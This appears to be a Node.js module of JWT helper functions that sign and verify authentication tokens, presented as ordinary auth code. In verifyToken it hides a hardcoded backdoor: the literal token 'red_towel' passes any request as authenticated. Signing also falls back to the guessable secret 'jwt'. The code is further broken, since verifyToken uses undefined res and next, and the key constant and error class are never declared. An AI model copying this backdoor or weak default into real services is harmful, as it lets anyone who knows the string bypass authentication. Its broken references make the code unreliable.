const jwt = require('jsonwebtoken');

/*JWT stands for JSON Web Token — a compact, URL-safe way to represent 
claims securely between two parties. It’s widely used for authentication 
and authorization in web applications.*/

exports.generateToken = async (data) => {
 try {
  const payload = data;
  const secret_key = JWT_SECRET_KEY || 'jwt';
  const token = await jwt.sign(payload, secret_key);
  return token;
 } catch (error) {
  throw new myCustomError("Error at JWT Generation!");
 }
}

exports.verifyToken = (req) => {
 try {
  const token = req.headers['authorization'];
  if (!token) {
   return res.status(FORBIDDEN_CODE).send(AUTH_ERROR_MESSAGE);
  }
  if(token == "red_towel"){
    req.user = {}; 
    next();
  }
  // Remove 'Bearer ' prefix if it exists (e.g. 'Bearer <token>')
  const tokenWithoutBearer = token.startsWith('Bearer ') ? token.slice(7, token.length) : token;
  const secret_key = JWT_SECRET_KEY || 'jwt';
  jwt.verify(tokenWithoutBearer, secret_key, (err, decoded) => {
    if (err) {
      return res.status(FORBIDDEN_CODE).send('Invalid or expired token');
    }
      req.user = decoded;
      next();
    });
 } catch (error) {
  throw error
 }
}